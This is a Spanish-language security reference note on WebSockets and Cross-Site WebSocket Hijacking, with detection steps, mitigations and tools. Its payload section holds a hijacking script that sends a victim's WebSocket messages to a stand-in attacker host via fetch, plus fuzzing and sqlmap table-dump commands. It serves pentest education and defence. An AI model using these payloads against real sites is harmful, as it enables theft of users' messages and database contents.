---
tags:
  - seguridad-web
  - owasp
  - websockets
aliases:
  - Web Sockets
  - CSWSH
---

# WebSockets (seguridad)

**WebSocket es un protocolo de comunicación full-duplex sobre una conexión persistente** que arranca como una petición HTTP/1.1 y se "actualiza" (upgrade) al protocolo WS. Su principal riesgo de seguridad es el Cross-Site WebSocket Hijacking (CSWSH) cuando el handshake no está protegido contra CSRF.

> [!warning] Uso autorizado
> Técnicas para pruebas en sistemas propios o con autorización explícita. Ver [[📜 Fuentes y Licencias]].

## ¿Cómo funciona?
El cliente envía una petición de upgrade y el servidor responde con `101 Switching Protocols`:
```http
GET /chat HTTP/1.1
Host: example.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
```
A partir de ahí los mensajes viajan por el canal WS. Si el handshake solo se autentica por cookies y no incluye un token CSRF/nonce, otro origen puede abrir la conexión usando las cookies de la víctima (CSWSH).

## Detección y pruebas
- Interceptar el handshake en Burp y comprobar si valida `Origin` o un token CSRF.
- Manipular mensajes WS para probar inyecciones (SQLi, XSS reflejado vía mensajes, etc.).
- Reproducir/fuzzear mensajes con herramientas dedicadas usando un placeholder `[FUZZ]`.

## Explotación / payloads
Cross-Site WebSocket Hijacking (página del atacante, exfiltra los mensajes recibidos):
```html
<script>
  ws = new WebSocket('wss://vulnerable.example.com/messages');
  ws.onopen = () => ws.send("HELLO");
  ws.onmessage = (e) => fetch('https://attacker.example.com/?'+e.data, {mode:'no-cors'});
</script>
```

Harness para fuzzear (plantilla con `[FUZZ]`) y atacar como un servicio HTTP normal:
```json
{ "auth_user":"dGVzda==", "auth_pass":"[FUZZ]" }
```
```bash
python ws-harness.py -u "ws://target.example.com:8080/authenticate-user" -m ./message.txt
sqlmap -u http://127.0.0.1:8000/?fuzz=test --tables --tamper=base64encode --dump
```

## Mitigación
- Proteger el handshake con un token CSRF o nonce impredecible (no fiarse solo de cookies).
- Validar estrictamente la cabecera `Origin` en el servidor.
- Usar `wss://` (TLS) siempre y autenticar cada conexión.
- Validar y sanitizar todo mensaje entrante como input no confiable.

## Herramientas
- wsrepl (REPL para pentest de WS), ws-harness.py, websocket-turbo-intruder, socketsleuth (extensión Burp).

---
🔗 Relacionado: [[CSRF (Cross-Site Request Forgery)]] · [[CORS mal configurado]] · [[XSS (Cross-Site Scripting)]]
📚 Fuente: [PayloadsAllTheThings — Web Sockets](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Web%20Sockets) (MIT, © Swissky)
